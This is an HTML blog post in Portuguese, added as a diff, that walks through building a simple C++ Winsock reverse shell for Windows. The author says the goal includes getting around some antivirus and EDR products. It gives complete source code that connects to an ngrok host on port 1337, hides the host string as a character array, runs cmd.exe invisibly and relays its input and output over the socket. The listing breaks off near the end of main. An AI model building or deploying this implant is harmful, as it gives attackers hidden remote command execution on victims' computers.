@@ -1,0 +1,583 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" href="../images/50.png" type="image/x-icon">
+  <title>Reverse-Shell</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/github-dark.min.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/languages/cpp.min.js"></script>
+  <script>
+    document.addEventListener('DOMContentLoaded', (event) => {
+      document.querySelectorAll('pre code').forEach((block) => {
+        hljs.highlightElement(block);
+      });
+    });
+  </script>
+  <style>
+    ::-webkit-scrollbar {
+      width: 10px;
+    }
+
+    ::-webkit-scrollbar-track {
+      background: #333;
+    }
+
+    ::-webkit-scrollbar-thumb {
+      background: #555;
+      border-radius: 5px;
+    }
+
+    ::-webkit-scrollbar-thumb:hover {
+      background: #777;
+    }
+
+    html {
+      scrollbar-color: #555 #333;
+      scrollbar-width: thin;
+    }
+  </style>
+  <style>
+    pre {
+      background-color: #1e1e1e;
+      color: #ffffff;
+      padding: 15px;
+      border-radius: 8px;
+      overflow-x: auto;
+      font-family: 'Courier New', monospace;
+      font-size: 14px;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+    }
+  </style>
+  <link rel="stylesheet" href="../style.css">
+  <link rel="stylesheet" href="../text_style.css">
+  <link rel="stylesheet" href="../background.css">
+  <link rel="stylesheet" href="../dimensao.css">
+  <link rel="stylesheet" href="../blog/test1.css">
+  <link rel="stylesheet" href="../head_style.css">
+  <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
+</head>
+
+<body>
+  <header style="height: 55px;">
+    <div class="logo">
+      <img src="../images/50.png" height="40" alt="Vith0r logo"
+        style="position: relative; left: none; height: 42px; width: 42px; top: -1px;">
+      <h2>
+        <a href="https://vith0r.github.io"
+          style="color: rgba(255, 255, 255, 0.7); text-decoration: none; position: relative; text-shadow: 3px 3px 5px rgba(139, 92, 246, 0.7); font-family: 'Press Start 2P', sans-serif; font-size: 19px;">
+          &nbsp;VITHOR
+        </a>
+      </h2>
+    </div>
+    <nav>
+      <div class="toggle-container">
+        <a href="../whoami.html">
+          <button class="tutorials-toggle"><i></i>Whoami</button>
+        </a>
+        <a href="../posts.html">
+          <button class="tools-toggle"><i></i>Posts</button>
+        </a>
+        <a href="../projects.html">
+          <button class="tools-toggle"><i></i>Projects</button>
+        </a>
+      </div>
+    </nav>
+  </header>
+  <script>
+    const element = document.querySelector('.logo h2 a');
+    const targetWord = "VITHOR";
+
+    function getRandomString(length) {
+      const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+      let result = '';
+      for (let i = 0; i < length; i++) {
+        result += characters.charAt(Math.floor(Math.random() * characters.length));
+      }
+      return result;
+    }
+
+    function animateRandomization(element, targetWord) {
+      const originalWord = targetWord.split('');
+      let iterations = 0;
+      const maxIterations = 15;
+      let currentWord = getRandomString(targetWord.length).split('');
+      let currentIndex = 0;
+
+      element.style.display = 'inline-block';
+      element.style.width = `${element.offsetWidth}px`;
+      element.style.position = 'relative';
+      element.style.left = '5px';
+
+      const interval = setInterval(() => {
+        if (iterations < maxIterations) {
+          currentWord = getRandomString(targetWord.length).split('');
+          iterations++;
+        } else {
+          if (currentIndex < targetWord.length) {
+            currentWord[currentIndex] = originalWord[currentIndex];
+            currentIndex++;
+          } else {
+            clearInterval(interval);
+          }
+        }
+        element.textContent = currentWord.join('');
+      }, 60);
+    }
+
+    setInterval(() => {
+      animateRandomization(element, targetWord);
+    }, 10000);
+
+    element.addEventListener('mouseover', () => {
+      animateRandomization(element, targetWord);
+    });
+
+    animateRandomization(element, targetWord);
+  </script>
+
+  <body>
+    <div class="grain-header"></div>
+    <main>
+      <div class="box">
+        <h1
+          style="color: rgba(255, 255, 255, 0.9); text-decoration: none; position: relative; text-shadow: 3px 3px 5px rgba(60, 122, 255, 0.8);">
+          Reverse Shell Simples</h1>
+        <br>
+        <p>Posted Oct 12, 2024. 11 min read</p>
+        <br>
+        <div class="post-author">
+          <a href="https://github.com/Vith0r" target="_blank">
+            <img src="https://avatars.githubusercontent.com/u/124220594?v=4" alt="Vithor logo">
+            <span>Vithor</span>
+          </a>
+        </div>
+
+        <article>
+          <div style="font-size: 16px;">
+            <p>Neste post, vamos explorar a criação de um <strong>Reverse Shell</strong> simples, com o objetivo de
+              contornar alguns <strong>AVs/EDRs</strong>. O objetivo deste post é focado em entender o funcionamento
+              básico de uma <strong>Reverse Shell</strong>. Vamos utilizar a linguagem <strong>C++</strong> com a API
+              <strong>Winsock</strong> para implementar a comunicação de rede e interagir com o processo do
+              <strong>cmd.exe</strong> no Windows.
+            </p>
+            <br>
+            <div style="padding: 10px; background-color: rgba(60, 122, 255, 0.2); color: white; margin-bottom: 10px;">
+              ⚠️ As informações que você encontrar neste post, técnicas, códigos, provas de conceito ou qualquer outra
+              coisa são estritamente para fins educacionais.
+            </div>
+            <br>
+            <p>Nosso código utiliza <strong>multithreading</strong>, <strong>pipes</strong>, e <strong>sockets</strong>
+              para interagir diretamente com o terminal remoto, permitindo o envio e recebimento de comandos. Ao longo
+              do desenvolvimento, vamos detalhar cada parte do código e como ela se relaciona com a construção de um
+              <strong>Reverse Shell</strong> funcional.
+            </p>
+            <h2 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">Parte Principal:
+              Configuração da Conexão de Rede</h2>
+            <p>A parte principal do nosso código é responsável por estabelecer a comunicação entre o cliente
+              <strong>máquina atacante</strong> e o servidor <strong>máquina alvo</strong>. Utilizamos o
+              <strong>Winsock</strong> para criar e conectar um socket que será usado para enviar e receber dados.
+            </p>
+            <br>
+            <pre
+              style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;">WSADATA wsaData;
+SOCKET sock;
+<span class="hljs-keyword">struct</span> <span class="hljs-title class_">addrinfo</span> hints = { <span class="hljs-number">0</span> }, * result;
+
+<span class="hljs-keyword">if</span> (<span class="hljs-built_in">WSAStartup</span>(<span class="hljs-built_in">MAKEWORD</span>(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>), &amp;wsaData) != <span class="hljs-number">0</span>) {
+    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Falha na inicializacao do Winsock\n&quot;</span>);
+    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+}
+
+hints.ai_family = AF_INET;
+hints.ai_socktype = SOCK_STREAM;
+hints.ai_protocol = IPPROTO_TCP;
+
+<span class="hljs-type">char</span> NotNgrok[] = { <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-number">0</span> };
+<span class="hljs-type">char</span> NotPort[] = { <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;7&#x27;</span>, <span class="hljs-number">0</span> };
+
+<span class="hljs-keyword">if</span> (<span class="hljs-built_in">getaddrinfo</span>(NotNgrok, NotPort, &amp;hints, &amp;result) != <span class="hljs-number">0</span>) {
+    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Falha no endereço NGROK\n&quot;</span>);
+    <span class="hljs-built_in">WSACleanup</span>();
+    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+}
+
+sock = <span class="hljs-built_in">socket</span>(result-&gt;ai_family, result-&gt;ai_socktype, result-&gt;ai_protocol);
+<span class="hljs-keyword">if</span> (sock == INVALID_SOCKET) {
+    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Falha ao criar socket: %d\n&quot;</span>, <span class="hljs-built_in">WSAGetLastError</span>());
+    <span class="hljs-built_in">freeaddrinfo</span>(result);
+    <span class="hljs-built_in">WSACleanup</span>();
+    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+}
+</pre>
+            <br>
+            <p>Aqui, configuramos o <strong>Winsock</strong> e criamos o socket que será usado para a comunicação. O
+              endereço IP e a porta do servidor são passados como strings. Utilizamos um endereço <a
+                href="https://ngrok.com/" href="https://ngrok.com/" style="color: #9E2525;">NGROK</a> para redirecionar
+              o tráfego para o cliente.</p>
+            <h2 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">Parte de
+              Comunicação: Interação com o cmd.exe</h2>
+            <p>Depois de configurar o socket, precisamos redirecionar a entrada e saída do processo <span
+                style="color: #9E2525;">cmd.exe</span> para o nosso socket, permitindo que os comandos recebidos sejam
+              executados e suas saídas retornadas ao atacante.</p>
+            <h2 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">Multithreading,
+              Pipes e Sockets</h2>
+            <p>Para que a nossa <strong>Reverse Shell</strong> funcione corretamente, precisamos lidar com a comunicação
+              entre dois processos distintos: o <span style="color: #9E2525;">cmd.exe</span> (que executa os comandos) e
+              o cliente (a máquina que enviará e receberá os comandos remotamente). Para isso, utilizamos três
+              componentes fundamentais: <strong>multithreading</strong>, <strong>pipes</strong>, e
+              <strong>sockets</strong>.
+            </p>
+            <h3 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">Multithreading
+            </h3>
+            <p>No nosso caso, como temos duas fontes de dados diferentes (o socket e o processo cmd.exe), precisamos de
+              duas threads separadas para tratar o envio e o recebimento de informações. A
+              <strong>multithreading</strong> permite que nosso programa execute múltiplas tarefas ao mesmo tempo, sem
+              que uma interfira na outra. Assim, enquanto uma thread recebe dados do socket e os envia para o <span
+                style="color: #9E2525;">cmd.exe</span>, a outra pode ler a saída do <span
+                style="color: #9E2525;">cmd.exe</span> e devolver ao atacante.
+            </p>
+            <p>Na implementação, criei duas threads principais:</p>
+            <ol style="list-style-type: none; padding-left: 0;">
+              <li style="margin-left: 0;"><strong>1</strong> <strong>Thread 1</strong>: responsável por ler a saída do
+                <span style="color: #9E2525;">cmd.exe</span> (por meio de pipes) e enviar essa saída de volta ao cliente
+                pela rede.
+              </li>
+              <li style="margin-left: 0;"><strong>2</strong> <strong>Thread 2</strong>: responsável por receber os
+                comandos enviados pelo atacante através do socket e passá-los para o <span
+                  style="color: #9E2525;">cmd.exe</span>, simulando uma sessão interativa de terminal.</li>
+            </ol>
+            <p>Ao dividir essas tarefas em threads separadas, evitamos que o programa fique travado esperando por uma
+              ação, garantindo que a comunicação seja rápida e fluida entre os dois lados.</p>
+            <h3 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">Pipes</h3>
+            <p>Os <strong>pipes</strong> são um mecanismo usado para redirecionar a entrada e a saída de processos no
+              Windows. Eles atuam como canais de comunicação entre o nosso programa e o processo <span
+                style="color: #9E2525;">cmd.exe</span>. Para o <span style="color: #9E2525;">cmd.exe</span>, a entrada
+              (stdin) e a saída (stdout) são redirecionadas para esses pipes, de forma que possamos &quot;escrever&quot;
+              comandos diretamente no stdin e &quot;ler&quot; os resultados a partir do stdout.</p>
+            <p>Criei dois pipes principais:</p>
+            <ul>
+              <li style="margin-left: 0;"><strong></strong> <strong>Pipe de entrada</strong>: recebe os dados do socket
+                (os comandos enviados pelo atacante) e os envia ao <span style="color: #9E2525;">cmd.exe</span>.</li>
+              <li style="margin-left: 0;"><strong></strong> <strong>Pipe de saída</strong>: captura a saída do <span
+                  style="color: #9E2525;">cmd.exe</span> e a envia de volta ao cliente, de forma que o atacante possa
+                ver o resultado dos comandos.</li>
+            </ul>
+            <p>Isso nos permite interagir diretamente com o processo, como se estivéssemos executando os comandos
+              localmente.</p>
+            <h3 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">Sockets</h3>
+            <p>Por último, utilizamos <strong>sockets</strong> para estabelecer a comunicação de rede entre a máquina
+              atacante e a máquina alvo. Um socket é basicamente um ponto final em uma conexão de rede. No nosso caso,
+              configuramos um socket TCP, que será responsável por enviar e receber dados da máquina remota.</p>
+            <p>Através do <strong>Winsock</strong>, que é a API de <strong>sockets</strong> do Windows, criamos uma
+              conexão entre o cliente (máquina atacante) e o servidor (máquina alvo). Esse socket atua como um canal de
+              comunicação bidirecional, o atacante envia comandos através dele, e nossa Reverse Shell recebe e executa
+              esses comandos, enviando as saídas de volta pelo mesmo canal.</p>
+            <h3 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">Criação dos
+              Pipes</h3>
+            <p>Criamos pipes para redirecionar a saída do <span style="color: #9E2525;">cmd.exe</span> (stdout) e a
+              entrada (stdin), utilizando a estrutura <strong>SECURITY_ATTRIBUTES</strong> para permitir a herança de
+              handles entre processos.</p>
+            <br>
+            <pre
+              style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;">HANDLE hStdoutRead, hStdoutWrite;
+HANDLE hStdinRead, hStdinWrite;
+SECURITY_ATTRIBUTES sa = { <span class="hljs-built_in">sizeof</span>(SECURITY_ATTRIBUTES), <span class="hljs-literal">NULL</span>, TRUE };
+
+<span class="hljs-keyword">if</span> (!<span class="hljs-built_in">CreatePipe</span>(&amp;hStdoutRead, &amp;hStdoutWrite, &amp;sa, <span class="hljs-number">0</span>)) {
+    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Falha ao criar pipe stdout\n&quot;</span>);
+    <span class="hljs-built_in">closesocket</span>(sock);
+    <span class="hljs-built_in">WSACleanup</span>();
+    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+}
+
+<span class="hljs-keyword">if</span> (!<span class="hljs-built_in">CreatePipe</span>(&amp;hStdinRead, &amp;hStdinWrite, &amp;sa, <span class="hljs-number">0</span>)) {
+    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Falha ao criar pipe stdin\n&quot;</span>);
+    <span class="hljs-built_in">closesocket</span>(sock);
+    <span class="hljs-built_in">WSACleanup</span>();
+    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+}
+</pre>
+            <br>
+            <p>Esses pipes permitem que os dados trafeguem entre o nosso programa e o processo do <span
+                style="color: #9E2525;">cmd.exe</span>.</p>
+            <h2 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">Criação do
+              Processo cmd.exe</h2>
+            <p>Em seguida, criamos o processo do <span style="color: #9E2525;">cmd.exe</span>, redirecionando sua
+              entrada e saída para os pipes que acabamos de criar.</p>
+            <br>
+            <pre
+              style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;">STARTUPINFO si = { <span class="hljs-number">0</span> };
+PROCESS_INFORMATION pi = { <span class="hljs-number">0</span> };
+si.cb = <span class="hljs-built_in">sizeof</span>(si);
+si.dwFlags = STARTF_USESTDHANDLES;
+si.hStdInput = hStdinRead;
+si.hStdOutput = hStdoutWrite;
+si.hStdError = hStdoutWrite;
+
+LPWSTR cmd = <span class="hljs-built_in">charToLPWSTR</span>(<span class="hljs-string">&quot;cmd.exe&quot;</span>);
+
+<span class="hljs-keyword">if</span> (!<span class="hljs-built_in">CreateProcess</span>(<span class="hljs-literal">NULL</span>, cmd, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, TRUE, CREATE_NO_WINDOW, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;si, &amp;pi)) {
+    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Falha ao criar o processo cmd.exe: %d\n&quot;</span>, <span class="hljs-built_in">GetLastError</span>());
+    <span class="hljs-built_in">closesocket</span>(sock);
+    <span class="hljs-built_in">WSACleanup</span>();
+    <span class="hljs-built_in">free</span>(cmd);
+    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+}
+
+<span class="hljs-built_in">free</span>(cmd);
+</pre>
+            <br>
+            <p>O processo <span style="color: #9E2525;">cmd.exe</span> é iniciado invisível, e suas entradas e saídas
+              estão agora conectadas aos nossos pipes.</p>
+            <h2 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">Threads para
+              Comunicação Bidirecional</h2><br>
+            <pre
+              style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;">ThreadParams readParams = { hStdoutRead, sock };
+ThreadParams writeParams = { hStdinWrite, sock };
+
+_beginthreadex(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, &amp;ReadFromCmd, &amp;readParams, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);
+_beginthreadex(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, &amp;WriteToCmd, &amp;writeParams, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);
+
+<span class="hljs-built_in">WaitForSingleObject</span>(pi.hProcess, INFINITE);
+</pre>
+            <br>
+            <p>E aqui, as <strong>threads</strong> são criadas para gerenciar o envio e recebimento de dados, e o
+              programa espera até que o processo <span style="color: #9E2525;">cmd.exe</span> seja finalizado.</p>
+            <h2 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">Código completo
+            </h2><br>
+            <pre
+              style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;winsock2.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ws2tcpip.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;process.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span>
+
+<span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib, <span class="hljs-string">&quot;ws2_32.lib&quot;</span>)</span>
+
+<span class="hljs-function">LPWSTR <span class="hljs-title">charToLPWSTR</span><span class="hljs-params">(<span class="hljs-type">const</span> std::string&amp; str)</span> </span>{
+    <span class="hljs-type">int</span> len = <span class="hljs-built_in">MultiByteToWideChar</span>(CP_ACP, <span class="hljs-number">0</span>, str.<span class="hljs-built_in">c_str</span>(), <span class="hljs-number">-1</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);
+    LPWSTR wString = (LPWSTR)<span class="hljs-built_in">malloc</span>(len * <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">wchar_t</span>));
+    <span class="hljs-keyword">if</span> (wString != <span class="hljs-literal">NULL</span>) {
+        <span class="hljs-built_in">MultiByteToWideChar</span>(CP_ACP, <span class="hljs-number">0</span>, str.<span class="hljs-built_in">c_str</span>(), <span class="hljs-number">-1</span>, wString, len);
+    }
+    <span class="hljs-keyword">return</span> wString;
+}
+
+<span class="hljs-keyword">struct</span> <span class="hljs-title class_">ThreadParams</span> {
+    HANDLE hPipe;
+    SOCKET sock;
+};
+
+<span class="hljs-function"><span class="hljs-type">unsigned</span> __stdcall <span class="hljs-title">ReadFromCmd</span><span class="hljs-params">(<span class="hljs-type">void</span>* params)</span> </span>{
+    ThreadParams* tp = <span class="hljs-built_in">static_cast</span>&lt;ThreadParams*&gt;(params);
+    HANDLE hPipe = tp-&gt;hPipe;
+    SOCKET sock = tp-&gt;sock;
+    <span class="hljs-type">char</span> buffer[<span class="hljs-number">1024</span>];
+    DWORD bytesRead;
+
+    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
+        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ReadFile</span>(hPipe, buffer, <span class="hljs-built_in">sizeof</span>(buffer) - <span class="hljs-number">1</span>, &amp;bytesRead, <span class="hljs-literal">NULL</span>) &amp;&amp; bytesRead &gt; <span class="hljs-number">0</span>) {
+            buffer[bytesRead] = <span class="hljs-string">&#x27;\0&#x27;</span>;
+            <span class="hljs-built_in">send</span>(sock, buffer, bytesRead, <span class="hljs-number">0</span>);
+        }
+        <span class="hljs-keyword">else</span> {
+            <span class="hljs-keyword">break</span>;
+        }
+    }
+
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+
+<span class="hljs-function"><span class="hljs-type">unsigned</span> __stdcall <span class="hljs-title">WriteToCmd</span><span class="hljs-params">(<span class="hljs-type">void</span>* params)</span> </span>{
+    ThreadParams* tp = <span class="hljs-built_in">static_cast</span>&lt;ThreadParams*&gt;(params);
+    HANDLE hPipe = tp-&gt;hPipe;
+    SOCKET sock = tp-&gt;sock;
+    <span class="hljs-type">char</span> buffer[<span class="hljs-number">1024</span>];
+    <span class="hljs-type">int</span> result_recv;
+    DWORD bytesWritten;
+
+    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
+        result_recv = <span class="hljs-built_in">recv</span>(sock, buffer, <span class="hljs-built_in">sizeof</span>(buffer) - <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);
+        <span class="hljs-keyword">if</span> (result_recv &gt; <span class="hljs-number">0</span>) {
+            <span class="hljs-built_in">WriteFile</span>(hPipe, buffer, result_recv, &amp;bytesWritten, <span class="hljs-literal">NULL</span>);
+        }
+        <span class="hljs-keyword">else</span> {
+            <span class="hljs-keyword">break</span>;
+        }
+    }
+
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+
+<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
+
+    WSADATA wsaData;
+    SOCKET sock;
+    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">addrinfo</span> hints = { <span class="hljs-number">0</span> }, * result;
+    STARTUPINFO si = { <span class="hljs-number">0</span> };
+    PROCESS_INFORMATION pi = { <span class="hljs-number">0</span> };
+    SECURITY_ATTRIBUTES sa = { <span class="hljs-built_in">sizeof</span>(SECURITY_ATTRIBUTES), <span class="hljs-literal">NULL</span>, TRUE };
+    HANDLE hStdoutRead, hStdoutWrite;
+    HANDLE hStdinRead, hStdinWrite;
+
+    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">WSAStartup</span>(<span class="hljs-built_in">MAKEWORD</span>(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>), &amp;wsaData) != <span class="hljs-number">0</span>) {
+        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Falha na inicializacao do Winsock\n&quot;</span>);
+        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+    }
+
+    hints.ai_family = AF_INET;
+    hints.ai_socktype = SOCK_STREAM;
+    hints.ai_protocol = IPPROTO_TCP;
+
+    <span class="hljs-type">char</span> NotNgrok[] = { <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-number">0</span> };
+    <span class="hljs-type">char</span> NotPort[] = { <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;7&#x27;</span>, <span class="hljs-number">0</span> };
+
+    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">getaddrinfo</span>(NotNgrok, NotPort, &amp;hints, &amp;result) != <span class="hljs-number">0</span>) {
+        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Falha no endereço NGROK\n&quot;</span>);
+        <span class="hljs-built_in">WSACleanup</span>();
+        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+    }
+
+    sock = <span class="hljs-built_in">socket</span>(result-&gt;ai_family, result-&gt;ai_socktype, result-&gt;ai_protocol);
+    <span class="hljs-keyword">if</span> (sock == INVALID_SOCKET) {
+        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Falha ao criar socket: %d\n&quot;</span>, <span class="hljs-built_in">WSAGetLastError</span>());
+        <span class="hljs-built_in">freeaddrinfo</span>(result);
+        <span class="hljs-built_in">WSACleanup</span>();
+        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+    }
+
+    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">connect</span>(sock, result-&gt;ai_addr, (<span class="hljs-type">int</span>)result-&gt;ai_addrlen) == SOCKET_ERROR) {
+        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Falha ao conectar ao servidor: %d\n&quot;</span>, <span class="hljs-built_in">WSAGetLastError</span>());
+        <span class="hljs-built_in">closesocket</span>(sock);
+        <span class="hljs-built_in">freeaddrinfo</span>(result);
+        <span class="hljs-built_in">WSACleanup</span>();
+        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+    }
+
+    <span class="hljs-built_in">freeaddrinfo</span>(result);
+
+    si.cb = <span class="hljs-built_in">sizeof</span>(si);
+    si.dwFlags = STARTF_USESTDHANDLES;
+
+    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">CreatePipe</span>(&amp;hStdoutRead, &amp;hStdoutWrite, &amp;sa, <span class="hljs-number">0</span>)) {
+        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Falha ao criar pipe stdout\n&quot;</span>);
+        <span class="hljs-built_in">closesocket</span>(sock);
+        <span class="hljs-built_in">WSACleanup</span>();
+        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+    }
+    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">CreatePipe</span>(&amp;hStdinRead, &amp;hStdinWrite, &amp;sa, <span class="hljs-number">0</span>)) {
+        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Falha ao criar pipe stdin\n&quot;</span>);
+        <span class="hljs-built_in">closesocket</span>(sock);
+        <span class="hljs-built_in">WSACleanup</span>();
+        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+    }
+
+    si.hStdInput = hStdinRead;
+    si.hStdOutput = hStdoutWrite;
+    si.hStdError = hStdoutWrite;
+
+    LPWSTR cmd = <span class="hljs-built_in">charToLPWSTR</span>(<span class="hljs-string">&quot;cmd.exe&quot;</span>);
+
+    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">CreateProcess</span>(<span class="hljs-literal">NULL</span>, cmd, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, TRUE, CREATE_NO_WINDOW, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;si, &amp;pi)) {
+        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Falha ao criar o processo cmd.exe: %d\n&quot;</span>, <span class="hljs-built_in">GetLastError</span>());
+        <span class="hljs-built_in">closesocket</span>(sock);
+        <span class="hljs-built_in">WSACleanup</span>();
+        <span class="hljs-built_in">free</span>(cmd);
+        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+    }
+
+    <span class="hljs-built_in">free</span>(cmd);
+
+    <span class="hljs-built_in">CloseHandle</span>(hStdoutWrite);
+    <span class="hljs-built_in">CloseHandle</span>(hStdinRead);
+
+    ThreadParams readParams = { hStdoutRead, sock };
+    ThreadParams writeParams = { hStdinWrite, sock };
+
+    _beginthreadex(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, &amp;ReadFromCmd, &amp;readParams, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);
+    _beginthreadex(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, &amp;WriteToCmd, &amp;writeParams, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);
+
+    <span class="hljs-built_in">WaitForSingleObject</span>(pi.hProcess, INFINITE);
+
+    <span class="hljs-built_in">CloseHandle</span>(pi.hProcess);
